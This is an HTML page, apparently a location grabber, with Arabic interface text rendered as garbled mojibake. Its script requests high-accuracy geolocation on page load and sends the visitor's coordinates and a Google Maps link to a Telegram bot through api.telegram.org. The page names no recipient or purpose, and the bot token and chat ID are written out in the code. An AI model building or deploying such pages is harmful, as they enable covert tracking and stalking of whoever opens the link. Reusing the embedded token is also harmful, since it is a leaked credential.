<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 500px;
            margin: 0 auto;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0088cc;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…ÙˆÙ‚Ø¹Ùƒ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ</h1>
        <p>ÙŠØªÙ… Ø§Ù„Ø¢Ù† Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ù…ÙˆÙ‚Ø¹Ùƒ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ...</p>
        <div class="loader"></div>
        <div id="status"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const statusElement = document.getElementById('status');
            statusElement.textContent = 'Ø¬Ø§Ø±ÙŠ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹...';
            
            if (navigator.geolocation) {
                // Ø§Ø³ØªØ®Ø¯Ø§Ù… watchPosition Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† getCurrentPosition Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø£Ø³Ø±Ø¹ Ø§Ø³ØªØ¬Ø§Ø¨Ø©
                const watchId = navigator.geolocation.watchPosition(
                    function(position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        
                        // Ø¥ÙŠÙ‚Ø§Ù Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¨Ø¹Ø¯ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„ÙŠÙ‡
                        navigator.geolocation.clearWatch(watchId);
                        
                        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¥Ù„Ù‰ Ø¨ÙˆØª ØªÙ„Ø¬Ø±Ø§Ù…
                        sendToTelegramBot(latitude, longitude);
                    },
                    function(error) {
                        let errorMessage;
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "ØªÙ… Ø±ÙØ¶ Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØºÙŠØ± Ù…ØªØ§Ø­Ø©.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "Ø§Ù†ØªÙ‡Ù‰ ÙˆÙ‚Øª Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹.";
                                break;
                            case error.UNKNOWN_ERROR:
                                errorMessage = "Ø­Ø¯Ø« Ø®Ø·Ø£ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ.";
                                break;
                        }
                        statusElement.textContent = errorMessage;
                        document.querySelector('.loader').style.display = 'none';
                    },
                    {
                        enableHighAccuracy: true, // Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¯Ù‚Ø© Ø£Ø¹Ù„Ù‰ ÙˆØ£Ø³Ø±Ø¹
                        maximumAge: 0, // Ø¹Ø¯Ù… Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø®Ø²Ù†Ø© Ù…Ø¤Ù‚ØªÙ‹Ø§
                        timeout: 5000 // ÙˆÙ‚Øª Ø§Ù†ØªØ¸Ø§Ø± Ù‚ØµÙŠØ±
                    }
                );
            } else {
                statusElement.textContent = "Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø®Ø¯Ù…Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ.";
                document.querySelector('.loader').style.display = 'none';
            }
        });

        function sendToTelegramBot(latitude, longitude) {
            const statusElement = document.getElementById('status');
            statusElement.textContent = 'Ø¬Ø§Ø±ÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹...';
            
                     // Ø§Ø³ØªØ¨Ø¯Ù„ Ù‡Ø°Ù‡ Ø§Ù„Ù‚ÙŠÙ… Ø¨Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¨ÙˆØªÙƒ
            const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
            const chatId = '7327464581';
            
            const message = `ğŸ“ ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ù…ÙˆÙ‚Ø¹ Ø¬Ø¯ÙŠØ¯:
Ø§Ù„Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶ÙŠ: ${latitude}
Ø§Ù„Ø®Ø· Ø§Ù„Ø·ÙˆÙ„ÙŠ: ${longitude}
Ø±Ø§Ø¨Ø· Ø®Ø±Ø§Ø¦Ø· Ø¬ÙˆØ¬Ù„: https://www.google.com/maps?q=${latitude},${longitude}`;
            
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            // Ø§Ø³ØªØ®Ø¯Ø§Ù… fetch Ù…Ø¹ AbortController Ù„Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…Ø³ØªØºØ±Ù‚
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000); // Ù…Ù‡Ù„Ø© 3 Ø«ÙˆØ§Ù†ÙŠ
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                }),
                signal: controller.signal
            })
            .then(response => response.json())
            .then(data => {
                clearTimeout(timeoutId);
                document.querySelector('.loader').style.display = 'none';
                if (data.ok) {
                    statusElement.textContent = 'ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¨Ù†Ø¬Ø§Ø­! ÙŠÙ…ÙƒÙ†Ùƒ Ø¥ØºÙ„Ø§Ù‚ Ù‡Ø°Ù‡ Ø§Ù„ØµÙØ­Ø©.';
                } else {
                    statusElement.textContent = 'ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¥Ù„Ù‰ Ø¨ÙˆØª ØªÙ„Ø¬Ø±Ø§Ù….';
                }
            })
            .catch(error => {
                clearTimeout(timeoutId);
                document.querySelector('.loader').style.display = 'none';
                if (error.name === 'AbortError') {
                    statusElement.textContent = 'Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…Ø®ØµØµ Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹.';
                } else {
                    statusElement.textContent = 'Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª.';
                }
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>